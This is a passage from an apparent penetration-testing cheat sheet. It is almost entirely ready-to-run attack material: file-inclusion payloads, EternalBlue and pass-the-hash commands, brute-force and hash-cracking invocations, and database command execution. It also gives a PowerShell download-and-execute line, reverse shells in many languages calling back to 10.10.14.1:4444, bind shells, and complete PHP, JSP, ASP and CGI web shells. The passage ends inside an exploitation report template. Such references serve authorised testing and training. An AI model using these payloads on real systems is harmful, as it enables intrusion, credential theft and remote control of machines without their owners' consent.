http://10.10.10.1/page.php?file=php://filter/convert.base64-encode/resource=config.php

# ROT13 encoding
http://10.10.10.1/page.php?file=php://filter/read=string.rot13/resource=config.php

# Data wrapper for code execution
http://10.10.10.1/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=whoami
# Base64 decodes to: <?php system($_GET['cmd']); ?>

# Input wrapper
http://10.10.10.1/page.php?file=php://input
# POST data: <?php system($_GET['cmd']); ?>

# Expect wrapper (if enabled)
http://10.10.10.1/page.php?file=expect://id

# RFI exploitation (if allow_url_include is on)
http://10.10.10.1/page.php?file=http://10.10.14.1/shell.txt
http://10.10.10.1/page.php?file=ftp://10.10.14.1/shell.txt

# LFI to RCE via file upload + LFI
# Upload image with PHP code in metadata
# Then include the uploaded file
http://10.10.10.1/page.php?file=./uploads/image.jpg&cmd=whoami

# Session file inclusion
http://10.10.10.1/page.php?file=/var/lib/php/sessions/sess_<session_id>

# Common files to read via LFI
/etc/passwd
/etc/shadow
/etc/hosts
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/www/html/config.php
/home/user/.bash_history
/root/.bash_history

# Windows-specific files
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\repair\sam
C:\windows\panther\unattend.xml
C:\windows\system32\config\software
C:\windows\system32\config\system
C:\inetpub\logs\logfiles\w3svc1\
```

### Network Service Exploitation

#### 1. SMB Exploitation
```bash
# EternalBlue exploitation (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.1
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit

# Alternative EternalBlue exploits
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.1
set SMBUser administrator
set SMBPass ""
exploit

# Manual EternalBlue with Python scripts
python eternalblue_exploit7.py 10.10.10.1 shellcode.bin
python zzz_exploit.py 10.10.10.1

# SMBGhost (CVE-2020-0796) exploitation
python smbghost.py -ip 10.10.10.1 -port 445

# SMB relay attack
# Terminal 1: Start responder
responder -I eth0 -wrf

# Terminal 2: Run ntlmrelayx
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Terminal 3: Trigger authentication
python3 printerbug.py domain.local/user:password@target.com listener_ip

# Pass-the-hash attack
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 administrator@10.10.10.1
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 administrator@10.10.10.1
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 administrator@10.10.10.1

# SMB enumeration and exploitation
smbmap -H 10.10.10.1 -u null -p null
smbclient //10.10.10.1/C$ -U administrator
rpcclient -U "" -N 10.10.10.1

# CrackMapExec for SMB exploitation
crackmapexec smb 10.10.10.0/24
crackmapexec smb 10.10.10.1 -u administrator -p password --shares
crackmapexec smb 10.10.10.1 -u administrator -p password -x "whoami"
crackmapexec smb 10.10.10.1 -u administrator -H hash --sam
```

#### 2. SSH Exploitation
```bash
# SSH brute force attack
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1
hydra -L users.txt -P passwords.txt ssh://10.10.10.1 -t 4
medusa -h 10.10.10.1 -u root -P passwords.txt -M ssh

# SSH with custom wordlists
hydra -l admin -P custom_passwords.txt ssh://10.10.10.1
ncrack -p 22 --user root -P passwords.txt 10.10.10.1

# Key-based authentication testing
ssh -i id_rsa user@10.10.10.1
ssh -o PreferredAuthentications=publickey -i id_rsa user@10.10.10.1

# SSH tunneling for pivoting (post-compromise)
ssh -L 8080:127.0.0.1:80 user@10.10.10.1  # Local port forwarding
ssh -R 4444:127.0.0.1:80 user@10.10.10.1  # Remote port forwarding
ssh -D 9050 user@10.10.10.1               # SOCKS proxy

# SSH configuration exploitation
# Check for weak configurations
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@10.10.10.1

# SSH user enumeration (timing attack - CVE-2016-6210)
for user in root admin administrator guest; do
    echo -n "$user: "
    time ssh -o ConnectTimeout=1 $user@10.10.10.1 2>&1 | grep -c "Permission denied"
done
```

#### 3. FTP Exploitation
```bash
# Anonymous FTP access
ftp 10.10.10.1
# Username: anonymous
# Password: anonymous (or blank)

# FTP brute force
hydra -l admin -P passwords.txt ftp://10.10.10.1
hydra -L users.txt -P passwords.txt ftp://10.10.10.1
medusa -h 10.10.10.1 -u admin -P passwords.txt -M ftp

# FTP bounce attack (port scanning through FTP server)
nmap -b ftp-user:ftp-pass@10.10.10.1:21 target.com
nmap -Pn -p- -b anonymous:anonymous@10.10.10.1:21 192.168.1.0/24

# VSFTPD 2.3.4 backdoor exploitation
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.1
exploit

# ProFTPD exploits
use exploit/linux/ftp/proftp_sreplace
use exploit/linux/ftp/proftp_telnet_iac

# FTP file upload/download
ftp> put malicious_file.txt
ftp> get sensitive_file.txt
ftp> mput *.php  # Upload multiple files
ftp> mget *.txt  # Download multiple files

# FTP passive vs active mode exploitation
ftp> passive  # Toggle passive mode
ftp> binary   # Set binary transfer mode
```

#### 4. Database Exploitation

##### MySQL Exploitation
```bash
# MySQL brute force
hydra -l root -P passwords.txt mysql://10.10.10.1:3306
nmap --script mysql-brute -p 3306 10.10.10.1

# MySQL enumeration
mysql -h 10.10.10.1 -u root -p
nmap --script mysql-enum -p 3306 10.10.10.1

# MySQL UDF (User Defined Function) exploitation
# Upload malicious UDF library
SELECT @@plugin_dir;
SELECT LOAD_FILE('/usr/lib/mysql/plugin/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'raptor_udf2.so';
SELECT sys_exec('chmod +s /bin/bash');

# MySQL file operations
SELECT LOAD_FILE('/etc/passwd');
SELECT 'php shell code' INTO OUTFILE '/var/www/html/shell.php';

# MySQL command execution (if configured)
SELECT sys_eval('whoami');
SELECT sys_exec('nc -e /bin/bash 10.10.14.1 4444');
```

##### PostgreSQL Exploitation
```bash
# PostgreSQL brute force
hydra -l postgres -P passwords.txt postgres://10.10.10.1:5432
nmap --script pgsql-brute -p 5432 10.10.10.1

# PostgreSQL enumeration and exploitation
psql -h 10.10.10.1 -U postgres
\l  # List databases
\c database_name  # Connect to database
\dt  # List tables
\du  # List users

# PostgreSQL command execution
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('nc -e /bin/bash 10.10.14.1 4444');

# PostgreSQL file operations
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"';
```

##### MSSQL Exploitation
```bash
# MSSQL brute force
hydra -l sa -P passwords.txt mssql://10.10.10.1:1433
nmap --script ms-sql-brute -p 1433 10.10.10.1

# MSSQL enumeration
sqlcmd -S 10.10.10.1 -U sa -P password
sqsh -S 10.10.10.1 -U sa -P password

# xp_cmdshell exploitation (if enabled)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(""http://10.10.14.1/shell.ps1"")"';

# MSSQL linked servers exploitation
SELECT * FROM OPENQUERY("linked_server", 'SELECT @@version');
EXEC ('EXEC xp_cmdshell ''whoami''') AT linked_server;

# Impacket MSSQL tools
python3 mssqlclient.py domain/user:password@10.10.10.1
python3 mssqlclient.py -windows-auth domain/user:password@10.10.10.1
```

### Password Attacks

#### 1. Hash Cracking with John the Ripper
```bash
# Identify hash types
john --list=formats | grep -i ntlm
john --format=raw-md5 hashes.txt
john --show --format=nt hashes.txt

# Dictionary attacks
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=custom_wordlist.txt --format=NT hashes.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt --format=sha512crypt shadow.txt

# Brute force attacks
john --incremental hashes.txt
john --incremental=alpha --format=raw-md5 hashes.txt
john --incremental=digits --format=nt hashes.txt

# Rule-based attacks
john --wordlist=wordlist.txt --rules=best64 hashes.txt
john --wordlist=wordlist.txt --rules=Jumbo hashes.txt

# Mask attacks (pattern-based)
john --mask='?a?a?a?a?a?a?a?a' hashes.txt  # 8 character all
john --mask='?d?d?d?d?d?d' hashes.txt      # 6 digits
john --mask='?u?l?l?l?l?d?d' hashes.txt    # Uppercase+4lower+2digits

# Custom character sets
john --mask='?1?1?1?1?1?1' --custom-charset1='aeiou' hashes.txt

# Show cracked passwords
john --show hashes.txt
john --show --format=nt hashes.txt

# Session management
john --session=my_session hashes.txt
john --restore=my_session
```

#### 2. Hash Cracking with Hashcat
```bash
# Hash mode identification
hashcat --help | grep -i ntlm
hashcat --example-hashes | grep -A2 -B2 "NTLM"

# Dictionary attacks
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512

# Rule-based attacks
hashcat -m 1000 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/dive.rule

# Brute force attacks
hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a  # 8 chars all
hashcat -m 0 hashes.txt -a 3 ?d?d?d?d?d?d         # 6 digits
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d    # Pattern

# Mask attacks with increment
hashcat -m 1000 hashes.txt -a 3 --increment --increment-min=6 --increment-max=8 ?a?a?a?a?a?a?a?a

# Hybrid attacks
hashcat -m 1000 hashes.txt -a 6 wordlist.txt ?d?d?d  # Wordlist + 3 digits
hashcat -m 1000 hashes.txt -a 7 ?d?d?d wordlist.txt  # 3 digits + wordlist

# GPU optimization
hashcat -m 1000 hashes.txt wordlist.txt -O  # Optimize for speed
hashcat -m 1000 hashes.txt wordlist.txt -w 3  # Workload profile (1-4)

# Show cracked passwords
hashcat -m 1000 hashes.txt --show
hashcat -m 1000 hashes.txt --show --outfile-format=3  # Show format hash:plain

# Session management
hashcat -m 1000 hashes.txt wordlist.txt --session=my_session
hashcat --restore --session=my_session

# Performance benchmarking
hashcat -b  # Benchmark all algorithms
hashcat -b -m 1000  # Benchmark specific algorithm
```

#### 3. Custom Wordlist Generation
```bash
# CeWL - Create wordlist from website
cewl http://10.10.10.1 -w custom_wordlist.txt
cewl http://10.10.10.1 -d 2 -m 5 -w deep_wordlist.txt  # Depth 2, min length 5
cewl http://10.10.10.1 --email -w wordlist_with_emails.txt

# Crunch - Generate wordlists
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 6 6 0123456789 -o 6digit_pins.txt
crunch 8 8 -t password@@@ -o password_variations.txt  # password + 3 chars

# Custom patterns with crunch
crunch 10 10 -t 201%%%%%%% -o years_pattern.txt  # 201 + 7 chars
crunch 8 8 -t @@@@%%%% -o alpha_digit_combo.txt  # 4 letters + 4 digits

# CUPP - Common User Passwords Profiler
python3 cupp.py -i  # Interactive mode
python3 cupp.py -w target_name  # Generate wordlist for specific person

# Combine wordlists
cat wordlist1.txt wordlist2.txt > combined_wordlist.txt
sort -u combined_wordlist.txt > unique_wordlist.txt

# Mentalist - GUI wordlist generator
mentalist  # GUI application

# Generate passwords based on patterns
# Company name variations
echo "CompanyName" | sed 's/.*/\L&/' > company_variations.txt  # lowercase
echo "CompanyName" | sed 's/.*/\U&/' >> company_variations.txt  # uppercase
echo "CompanyName" | sed 's/\(.\)/\U\1/' >> company_variations.txt  # capitalize

# Year variations
for year in {2010..2024}; do echo $year >> years.txt; done

# Common patterns combination
cat << 'EOF' > generate_patterns.py
#!/usr/bin/env python3
import itertools

base_words = ['password', 'admin', 'login', 'company']
numbers = ['123', '2023', '2024', '01', '00']
symbols = ['!', '@', '#', ']

combinations = []
for word in base_words:
    for num in numbers:
        combinations.append(word + num)
        combinations.append(num + word)
        for symbol in symbols:
            combinations.append(word + num + symbol)
            combinations.append(word + symbol + num)

with open('generated_passwords.txt', 'w') as f:
    for combo in combinations:
        f.write(combo + '\n')
EOF

python3 generate_patterns.py
```

#### 4. Network Authentication Attacks
```bash
# Hydra - Multi-protocol brute forcer
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://10.10.10.1
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1 -t 4 -V

# HTTP POST form brute force
hydra -l admin -P passwords.txt http-post-form://10.10.10.1/login.php:"username=^USER^&password=^PASS^:Invalid login"
hydra -L users.txt -P passwords.txt http-post-form://10.10.10.1/admin/:"user=^USER^&pass=^PASS^&submit=Login:Failed"

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt http-get://10.10.10.1/admin/

# SMB brute force
hydra -L users.txt -P passwords.txt smb://10.10.10.1
hydra -l administrator -P passwords.txt smb://10.10.10.1

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://10.10.10.1
hydra -l administrator -P passwords.txt rdp://10.10.10.1 -V

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.1
hydra -l admin -P passwords.txt ftp://10.10.10.1

# SMTP brute force
hydra -L users.txt -P passwords.txt smtp://10.10.10.1:587
hydra -l admin -P passwords.txt smtp-enum://10.10.10.1

# VNC brute force
hydra -P passwords.txt vnc://10.10.10.1

# Medusa - Alternative to Hydra
medusa -h 10.10.10.1 -u admin -P passwords.txt -M http -m DIR:/admin -f
medusa -h 10.10.10.1 -U users.txt -P passwords.txt -M ssh -f
medusa -h 10.10.10.1 -u administrator -P passwords.txt -M smbnt -f

# Ncrack - High-speed network authentication cracker
ncrack -vv --user admin -P passwords.txt rdp://10.10.10.1
ncrack -vv -U users.txt -P passwords.txt ssh://10.10.10.1:22
ncrack -vv --user admin -P passwords.txt http://10.10.10.1/admin

# PatatorNetwork service brute forcing
patator ssh_login host=10.10.10.1 user=admin password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
patator ftp_login host=10.10.10.1 user=admin password=FILE0 0=passwords.txt
patator http_fuzz url=http://10.10.10.1/login.php method=POST body='username=admin&password=FILE0' 0=passwords.txt
```

### Reverse Shells and Bind Shells

#### 1. Reverse Shell Payloads
```bash
# Bash reverse shells
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
exec /bin/bash 0&0 2>&0
0<&196;exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

# Netcat reverse shells
nc -e /bin/bash 10.10.14.1 4444
nc -c /bin/bash 10.10.14.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f

# Python reverse shells
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Advanced Python reverse shell with error handling
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP reverse shells
php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.14.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.14.1",4444);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.10.14.1",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

# Ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("10.10.14.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Perl reverse shell
perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Java reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# Lua reverse shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.1','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# NodeJS reverse shell
node -e "(function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(4444, '10.10.14.1', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();"

# PowerShell reverse shells
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PowerShell encoded reverse shell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
powershell -enc $EncodedText

# Socat reverse shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444

# AWK reverse shell
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.1/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

#### 2. Bind Shell Payloads
```bash
# Netcat bind shell
nc -lvp 4444 -e /bin/bash
nc -lvp 4444 -c /bin/bash

# Python bind shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP bind shell
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,1);}}'

# Socat bind shell
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

#### 3. Web Shells
```bash
# Simple PHP web shell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>

# Advanced PHP web shell with features
<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if(function_exists('system')){
        @ob_start();
        @system($cmd);
        $output = @ob_get_contents();
        @ob_end_clean();
    } elseif(function_exists('exec')){
        @exec($cmd,$results);
        $output = "";
        foreach($results as $result){
            $output .= $result;
        }
    } elseif(function_exists('shell_exec')){
        $output = @shell_exec($cmd);
    } elseif(function_exists('passthru')){
        @ob_start();
        @passthru($cmd);
        $output = @ob_get_contents();
        @ob_end_clean();
    }
    print $output;
}
?>
<form method="POST">
Command: <input type="text" name="cmd" />
<input type="submit" value="Execute" />
</form>

# JSP web shell
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
}
%>
<form>
Command: <input type="text" name="cmd" />
<input type="submit" value="Execute" />
</form>

# ASP web shell
<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
Sub RunCmd(Src As Object, E As EventArgs)
    Dim myProcess As New Process()
    Dim myProcessStartInfo As New ProcessStartInfo(cmd.text)
    myProcessStartInfo.UseShellExecute = false
    myProcessStartInfo.RedirectStandardOutput = true
    myProcess.StartInfo = myProcessStartInfo
    myProcess.Start()
    
    Dim myStreamReader As StreamReader = myProcess.StandardOutput
    Dim myString As String = myStreamReader.ReadToEnd()
    myProcess.Close()
    result.text= vbcrlf & "<pre>" & myString & "</pre>"
End Sub
</script>

# Python CGI web shell
#!/usr/bin/env python3
import cgi, subprocess, cgitb

cgitb.enable()
form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

print("Content-Type: text/html\n")
print("<form method='POST'>")
print("Command: <input type='text' name='cmd' />")
print("<input type='submit' value='Execute' />")
print("</form>")

if cmd:
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        print("<pre>" + output.decode() + "</pre>")
    except subprocess.CalledProcessError as e:
        print("<pre>Error: " + e.output.decode() + "</pre>")
```

#### 4. Shell Stabilization and Upgrade
```bash
# Python TTY upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Full interactive shell upgrade process
# Step 1: Spawn bash with python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)
^Z

# Step 3: Disable echo and send shell to foreground
stty raw -echo; fg

# Step 4: Reset the terminal (press Enter twice)
reset

# Step 5: Set terminal type and size
export TERM=xterm
stty rows 38 columns 116  # Adjust to your terminal size

# Alternative stabilization methods
# Using script command
script -qc /bin/bash /dev/null

# Using expect (if available)
expect -c 'spawn /bin/bash; interact'

# Using socat for full TTY
# On attacker machine
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine
socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444

# Upgrading restricted shells
# If rbash or restricted shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
bash

# Break out of restricted environments
/bin/bash -i
/bin/sh -i
python -c "import os; os.system('/bin/bash')"
echo os.system('/bin/bash')
/bin/bash -c /bin/bash
vi -> :shell or :!/bin/bash
awk 'BEGIN {system("/bin/bash")}'
find . -exec /bin/bash \; -quit
```

### Exploitation Documentation and Evidence Collection

#### 1. Evidence Collection during Exploitation
```bash
# Automated logging of all commands
script -a exploitation_log_$(date +%Y%m%d_%H%M%S).txt

# Network traffic capture during exploitation
sudo tcpdump -i any -w exploitation_traffic_$(date +%Y%m%d_%H%M%S).pcap host 10.10.10.1

# Screenshot evidence (Linux)
import -window root exploitation_screenshot_$(date +%Y%m%d_%H%M%S).png
scrot exploitation_screenshot_$(date +%Y%m%d_%H%M%S).png

# Screenshot evidence (Windows)
# Using PowerShell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')

# Hash verification of exploit files
sha256sum exploit_file.exe > exploit_file.exe.sha256
md5sum payload.php > payload.php.md5
sha1sum shell.jsp > shell.jsp.sha1

# Create evidence archive
tar -czf exploitation_evidence_$(date +%Y%m%d_%H%M%S).tar.gz *.log *.pcap *.png *.txt exploits/

# Document system state before/after exploitation
# Before exploitation
ps aux > processes_before.txt
netstat -tuln > network_before.txt
ls -la /tmp > tmp_before.txt

# After exploitation
ps aux > processes_after.txt
netstat -tuln > network_after.txt
ls -la /tmp > tmp_after.txt

# Compare states
diff processes_before.txt processes_after.txt > process_changes.txt
diff network_before.txt network_after.txt > network_changes.txt
```

#### 2. Exploitation Report Template
```bash
cat << 'EOF' > exploitation_report_template.md
# EXPLOITATION REPORT

## Target Information
- **Target IP**: 10.10.10.1
- **Target OS**: Ubuntu 18.04 LTS
- **Service**: Apache HTTP Server 2.4.29
- **Vulnerability**: SQL Injection in login form

## Exploitation Timeline
- **Start Time**: 2024-01-15 10:30:00
- **Initial Access**: 2024-01-15 10:45:15
- **Privilege Escalation**: 2024-01-15 11:20:30
- **End Time**: 2024-01-15 12:00:00

## Exploitation Details

### Initial Vector
**Vulnerability Used**: SQL Injection (CVE-2023-XXXXX)
**Exploit Method**: Manual injection + SQLMap automation
**Access Gained**: Database access, authentication bypass

### Commands Executed
```bash
# Initial SQLi discovery
curl "http://10.10.10.1/login.php" -d "username=admin'&password=test"

# SQLMap enumeration
sqlmap -u "http://10.10.10.1/login.php"

